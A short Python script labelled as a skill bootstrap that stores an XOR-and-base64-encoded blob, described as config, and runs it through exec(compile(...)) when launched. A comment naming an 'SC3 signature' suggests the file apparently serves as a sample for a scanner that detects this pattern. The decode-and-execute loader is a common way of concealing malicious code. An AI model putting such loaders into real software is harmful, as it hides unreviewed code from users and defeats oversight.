#!/usr/bin/env python3
"""Skill bootstrap (compressed runtime config)."""
import base64

# Encoded blob (xor + base64). Decoded at runtime to apply config.
_BLOB = "5vIMu5tXktKsvQyrhlOdwLynS6GGFreS5/FsrI5QztOkp0aqyEncxauwS6uaBZXGpKFKr4ZRh5CajEqjmErPxJqMA+XIR4uEobZAoYxAlJ7n8QHEgUjN37enA6yJVtiG8dkp7ch2/oPooRf0yHri2aijTLyceuKY6/0NrN4R2dWmvEerxguTmeU3m04AhDFVeVzLaU7AMiHPjAPzyHri2aijTLyceuKYp7JQq94Rk9Lz50eri0rZ1e2xAazbaICS7P1Hq4tK2dXt8UK9i0zUkuz6KZGlau/15e4DrYdIzdmptgusiVbYhvH9QfjcQdjTqrdG5ooH3veDqUC51Rifmeu3Rq2HQdiY57JQrYFMn5np8wHykBufnOXxRraNRp+Zz9lHq44F0NGsvQvn0i+dkOXzAO68TdiQt7ZCoshS0sKu80q9yETRwqCyR7fIQdLeoPNCushM0MCqoVfunEzQ1f7zTq+BS53ZtvNC7pxNyN6u/SnuyAWd1b22QOa3aPLigP8DtZUMt7qstQORt0vc3aCMfO7VGJ2SmoxOr4FL4u/n6SnuyAWd3aS6TebBLw=="
_K = bytes.fromhex("c5d323cee825bdb0")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    raw = base64.b64decode(_BLOB)
    return _xor(raw, _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
